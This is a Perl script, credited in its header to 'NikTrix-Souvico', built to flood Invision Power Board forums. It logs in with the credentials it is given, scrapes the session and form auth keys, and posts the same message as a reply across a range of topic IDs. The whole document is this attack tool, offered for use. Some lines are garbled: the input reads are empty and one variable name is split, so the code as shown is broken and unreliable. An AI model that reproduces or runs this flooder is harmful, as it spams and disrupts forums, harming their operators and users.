#----------------------------
# this programe has been #
# created by NikTrix-Souvico #
# [ 'HellSoft' ] for #
# Flooding IPB Forums #
#----------------------------

#!/usr/bin/perl -w
use strict;
use LWP::UserAgent;
use HTTP::Cookies;

#Variables
my $url = undef;
my $login = "act=Login&CODE=01";
my $UserName = undef;
my $PassWord = undef;
my $CookieDate = 1;
my $SID = undef;
my $SE = undef;
my $MSG = undef;

#Prototype
sub IPBFlood($);

#Main
print "\t\tWelcome to IPBFlood 0.1x By Souvik\t\t[ 'NikTrix' ]Team";

print "Url\t: ";chomp($url=);
print "UserName\t: ";chomp($UserName=);
print "Password\t: ";chomp($PassWord=);
print "Start [to] End\t: ";chomp($SE=);
print "Message\t: ";chomp($MSG=);

my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/4.0");
my $cj = HTTP::Cookies->new(file => "N/A" , autosave => 0);
$ua->cookie_jar($cj);

#-get SID
my $r = $ua->get($url);
if($r->is_success){
#Find SID ?
($SID) = $r->content =~/\?s=(\w{32})&.*/i;
print "SID : $SID";
}

#-Connecting ...
$r = $ua->post($url.$login,[UserName=> $UserName ,PassWord => $PassWord ,CookieDate =>$CookieDate , s => $SID]);
if($r->is_success){
print "[+] Connected" if($r->content =~ /cliquez ici si vous ne souhaitez pas/gi);
my($Start , $End) = split(/-/,$SE);
foreach($Start..$End){
IPBFlood($_);
}
}

#Subroutines
sub IPBFlood($){
my $Topic = shift;
my $get = $ua->get($url."s=$SID&showtopic=$Topic");
if($get->is_success){
#Get Subforum ID "f" : variable !
if( my ($f) = $get->content =~/f=(\d{1,4})/ ){
print "[-]Subforum ID : $f & Topic N : $Topic";
#Get Post AuthKey for Subforum f=NÂ°
$get = $ua->get($url."s=$SID&act=post&do=reply_post&f=$f&t=$T opic");
# act=post&do=reply_post&f=56&t=43988
if($get->is_success){
##auth_key Ex :
my ( $auth_key ) = $get->content =~/auth_key.*(\w{32})/i;
#attach_post_key Ex :
my ( $attach_post_key ) = $get->content =~/attach_post_key.*(\w{32})/i;
print "[-]auth_key : $auth_key[-]attach_post_key : $attach_post_key";


my %form =(st => 0,
act => "Post",
s => "$SID",
f => "$f",
auth_key => "$auth_key",
removeattachid => "0",
CODE => "03",
t => "$Topic",
attach_post_key => "$attach_post_key",
parent_id => "0",
"ed-0_wysiwyg_used"=> "0",
"editor_ids%5B%5D" => "ed-0",
Post => "$MSG",
enableemo => "yes",
enablesig => "yes",
iconid => "0"
);
$r = $ua->post($url."s=$SID",\%form);
if($r->is_success){
print "Send success !" if( length($r->content)< 300);
}
}
}
}
}